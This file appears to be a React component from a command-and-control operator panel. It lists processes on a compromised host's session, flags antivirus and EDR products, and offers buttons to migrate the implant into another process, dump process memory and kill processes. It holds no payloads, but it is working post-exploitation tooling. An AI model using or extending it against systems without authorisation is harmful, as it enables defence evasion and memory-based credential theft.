import { useCallback, useEffect, useMemo, useState } from 'react'
import { useTranslation } from 'react-i18next'
import { api } from '../../lib/api'
import type { AVProcess, AVScanResult, ProcessInfo } from '../../lib/types'
import ConfirmDialog from '../common/ConfirmDialog'
import { useToast } from '../common/Toast'

// Category ordering: security products first, then software, then system
// processes. Anything the service invents later lands after these.
const CATEGORY_ORDER = ['security', 'software', 'system', 'unknown']

const CATEGORY_TONE: Record<string, string> = {
  security: 'var(--danger, #d64545)',
  software: 'var(--accent, #3b82f6)',
  system: 'var(--ok, #2f9e44)',
  unknown: 'var(--muted, #8a8f98)',
}

export default function ProcessesTab({ sessionId }: { sessionId: string }) {
  const { t } = useTranslation()
  const toast = useToast()
  const [procs, setProcs] = useState<ProcessInfo[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState('')
  const [confirm, setConfirm] = useState<'kill' | 'migrate' | null>(null)
  const [targetPid, setTargetPid] = useState(0)
  const [targetName, setTargetName] = useState('')
  const [busy, setBusy] = useState(false)

  // AV identification state.
  const [av, setAv] = useState<AVScanResult | null>(null)
  const [avBusy, setAvBusy] = useState(false)
  const [avFilter, setAvFilter] = useState('')
  const [showAvOnly, setShowAvOnly] = useState(false)
  const [dumpBusy, setDumpBusy] = useState(0)

  const load = useCallback(async () => {
    setLoading(true)
    setError('')
    try {
      const d = await api.ps(sessionId)
      setProcs(d.processes || [])
    } catch (e) {
      setError((e as Error).message)
    } finally {
      setLoading(false)
    }
  }, [sessionId])

  useEffect(() => {
    load()
  }, [load])

  // Map pid -> identification, and executable -> identification so the table
  // can annotate every row of a multi-process image (chrome.exe runs a dozen).
  const byPid = useMemo(() => {
    const m = new Map<number, AVProcess>()
    for (const hit of av?.matches || []) {
      if (hit.process) m.set(hit.process.PID, hit)
    }
    return m
  }, [av])

  const byName = useMemo(() => {
    const m = new Map<string, AVProcess>()
    for (const hit of av?.matches || []) {
      const key = hit.key?.toLowerCase()
      if (key && !m.has(key)) m.set(key, hit)
    }
    return m
  }, [av])

  const annotate = useCallback(
    (p: ProcessInfo): AVProcess | undefined =>
      byPid.get(p.PID) || byName.get((p.Executable || '').toLowerCase()),
    [byPid, byName],
  )

  const visible = useMemo(
    () => (showAvOnly && av ? procs.filter((p) => annotate(p)) : procs),
    [procs, showAvOnly, av, annotate],
  )

  const kill = async (pid: number) => {
    setBusy(true)
    try {
      await api.killProcess(sessionId, pid)
      setConfirm(null)
      load()
    } catch (e) {
      setError((e as Error).message)
    } finally {
      setBusy(false)
    }
  }

  const migrate = async (pid: number, procName: string) => {
    setBusy(true)
    try {
      // The server rebuilds the C2 config from the live session; pass the pid,
      // and the name as a fallback for when the pid has been recycled.
      await api.migrate(sessionId, pid, procName)
      setConfirm(null)
      setError('')
      toast.push('success', t('processes.migrateOk', { pid }))
      load()
    } catch (e) {
      setError((e as Error).message)
    } finally {
      setBusy(false)
    }
  }

  const dump = async (pid: number) => {
    setDumpBusy(pid)
    setError('')
    try {
      const blob = await api.processDump(sessionId, pid)
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = `dump-${pid}.dmp`
      a.click()
      URL.revokeObjectURL(url)
      toast.push('success', t('processes.dumpOk', { pid, size: formatBytes(blob.size) }))
    } catch (e) {
      setError((e as Error).message)
    } finally {
      setDumpBusy(0)
    }
  }

  const runAv = async () => {
    setAvBusy(true)
    setError('')
    try {
      const res = await api.avScan(sessionId, avFilter.trim())
      setAv(res)
      toast.push('success', t('processes.avDone', { n: res.matches.length }))
      if (res.matches.length > 0) setShowAvOnly(true)
    } catch (e) {
      setError((e as Error).message)
    } finally {
      setAvBusy(false)
    }
  }

  // Group the identified processes for the summary panel.
  const grouped = useMemo(() => {
    if (!av) return []
    const keys = Object.keys(av.groups || {})
    keys.sort((a, b) => {
      const ia = CATEGORY_ORDER.indexOf(a)
      const ib = CATEGORY_ORDER.indexOf(b)
      return (ia < 0 ? 99 : ia) - (ib < 0 ? 99 : ib)
    })
    return keys.map((k) => ({ category: k, items: av.groups[k] || [] }))
  }, [av])

  return (
    <div className="card card-flush">
      <div
        style={{
          padding: '12px 16px',
          display: 'flex',
          gap: 8,
          alignItems: 'center',
          flexWrap: 'wrap',
        }}
      >
        <input
          className="input"
          style={{ maxWidth: 220 }}
          placeholder={t('processes.avFilterPlaceholder')}
          value={avFilter}
          onChange={(e) => setAvFilter(e.target.value)}
        />
        <button
          type="button"
          className="btn sm primary"
          disabled={avBusy || procs.length === 0}
          onClick={runAv}
          title={t('processes.avHint')}
        >
          {avBusy ? t('common.loading') : t('processes.avScan')}
        </button>
        {av && (
          <>
            <label
              style={{ display: 'flex', gap: 6, alignItems: 'center', fontSize: 13 }}
              title={t('processes.avOnlyHint')}
            >
              <input
                type="checkbox"
                checked={showAvOnly}
                onChange={(e) => setShowAvOnly(e.target.checked)}
              />
              {t('processes.avOnly')}
            </label>
            <span style={{ fontSize: 12, opacity: 0.7 }}>
              {t('processes.avStats', {
                sent: av.stats.sent,
                found: av.matches.length,
              })}
            </span>
            <button type="button" className="btn sm" onClick={() => { setAv(null); setShowAvOnly(false) }}>
              {t('processes.avClear')}
            </button>
          </>
        )}
        <div style={{ marginLeft: 'auto' }}>
          <button type="button" className="btn sm" onClick={load}>
            {t('processes.refresh')}
          </button>
        </div>
      </div>

      {error && (
        <div style={{ padding: '0 16px 12px' }}>
          <div className="error-banner">{error}</div>
        </div>
      )}

      {/* Identified security products get their own panel: on a domain host the
          installed EDR is the single most important thing to know before
          touching anything. */}
      {av && grouped.length > 0 && (
        <div style={{ padding: '0 16px 12px' }}>
          {grouped.map((g) => (
            <div key={g.category} style={{ marginBottom: 10 }}>
              <div
                style={{
                  fontSize: 12,
                  fontWeight: 600,
                  color: CATEGORY_TONE[g.category] || 'inherit',
                  marginBottom: 4,
                }}
              >
                {t(`processes.cat.${g.category}`, g.category)} ({g.items.length})
              </div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
                {g.items.map((hit, i) => (
                  <span
                    key={`${hit.key}-${hit.pid}-${i}`}
                    className="badge"
                    style={{
                      borderColor: CATEGORY_TONE[g.category] || 'inherit',
                      color: CATEGORY_TONE[g.category] || 'inherit',
                    }}
                    title={`PID ${hit.pid} - ${hit.value}`}
                  >
                    {hit.key}
                    <span style={{ opacity: 0.65 }}> · {hit.pid}</span>
                  </span>
                ))}
              </div>
            </div>
          ))}
          {av.unmatched.length > 0 && (
            <details style={{ fontSize: 12, opacity: 0.8 }}>
              <summary>{t('processes.avUnmatched', { n: av.unmatched.length })}</summary>
              <div className="mono" style={{ marginTop: 4, lineHeight: 1.5 }}>
                {av.unmatched.join(', ')}
              </div>
            </details>
          )}
        </div>
      )}

      {loading ? (
        <div className="empty">{t('common.loading')}</div>
      ) : visible.length === 0 ? (
        <div className="empty">{t('processes.empty')}</div>
      ) : (
        <table className="data">
          <thead>
            <tr>
              <th>{t('processes.thPid')}</th>
              <th>{t('processes.thPpid')}</th>
              <th>{t('processes.thName')}</th>
              <th>{t('processes.thAv')}</th>
              <th>{t('processes.thOwner')}</th>
              <th>{t('processes.thCmd')}</th>
              <th></th>
            </tr>
          </thead>
          <tbody>
            {visible.map((p) => {
              const hit = annotate(p)
              return (
                <tr key={p.PID}>
                  <td className="mono">{p.PID}</td>
                  <td className="mono">{p.PPID}</td>
                  <td>{p.Executable}</td>
                  <td>
                    {hit ? (
                      <span
                        title={hit.value}
                        style={{ color: CATEGORY_TONE[hit.category] || 'inherit', fontSize: 12 }}
                      >
                        {hit.value}
                      </span>
                    ) : (
                      <span style={{ opacity: 0.3 }}>-</span>
                    )}
                  </td>
                  <td>{p.Owner}</td>
                  <td className="mono" style={{ maxWidth: 360, overflow: 'hidden', textOverflow: 'ellipsis' }}>
                    {p.CmdLine?.join(' ') || '-'}
                  </td>
                  <td>
                    <div className="fs-actions">
                      <button
                        type="button"
                        className="btn sm"
                        disabled={busy}
                        title={t('processes.migrateHint')}
                        onClick={() => {
                          setTargetPid(p.PID)
                          setTargetName(p.Executable)
                          setConfirm('migrate')
                        }}
                      >
                        {t('processes.migrate')}
                      </button>
                      <button
                        type="button"
                        className="btn sm"
                        disabled={dumpBusy === p.PID}
                        title={`${t('processes.dumpHint')} - ${t('processes.dumpLimitHint')}`}
                        onClick={() => dump(p.PID)}
                      >
                        {dumpBusy === p.PID ? t('common.loading') : t('processes.dump')}
                      </button>
                      <button
                        type="button"
                        className="btn sm danger"
                        disabled={busy}
                        onClick={() => {
                          setTargetPid(p.PID)
                          setTargetName(p.Executable)
                          setConfirm('kill')
                        }}
                      >
                        {t('processes.kill')}
                      </button>
                    </div>
                  </td>
                </tr>
              )
            })}
          </tbody>
        </table>
      )}
      <ConfirmDialog
        open={confirm !== null}
        title={confirm === 'kill' ? t('processes.kill') : t('processes.migrate')}
        danger={confirm === 'kill'}
        busy={busy}
        confirmLabel={confirm === 'kill' ? t('processes.kill') : t('processes.migrate')}
        onConfirm={() =>
          confirm === 'kill'
            ? kill(targetPid)
            : confirm === 'migrate'
              ? migrate(targetPid, targetName)
              : undefined
        }
        onCancel={() => setConfirm(null)}
      >
        <p>
          {confirm === 'kill'
            ? t('processes.confirmKill', { pid: targetPid })
            : t('processes.confirmMigrate', { pid: targetPid })}
        </p>
      </ConfirmDialog>
    </div>
  )
}

function formatBytes(n: number): string {
  if (n < 1024) return `${n} B`
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`
  return `${(n / 1024 / 1024).toFixed(1)} MB`
}
